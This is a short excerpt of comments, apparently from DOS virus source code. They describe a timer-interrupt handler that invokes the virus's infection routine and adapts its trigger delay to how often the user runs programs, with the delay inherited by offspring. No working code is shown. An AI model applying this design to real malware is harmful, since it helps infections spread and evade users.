;This is the interrupt 1C (timer) handler for the virus. It is responsible
;for invoking the infection routine for the virus. This part of the virus
;implements Lamarkian evolution by trying to adjust TRIGGER_SET to the
;user's habits. The TRIGGER timer is initially set to TRIGGER_SET, and then
;decremented by this routine. When it is decremented to 0, the routine begins
;to increment TRIGGER_OVER. Every 32 increments, it also increments TRIGGER_SET.
;This has the effect that the trigger time will get longer if the user does
;not execute programs every TRIGGER_SET clock ticks. This is Lamarkian because
;the parent and child always have the same TRIGGER_SET at the time of
;reproduction. TRIGGER_SET does vary from generation to generation, though,
;because it varies in the parent.
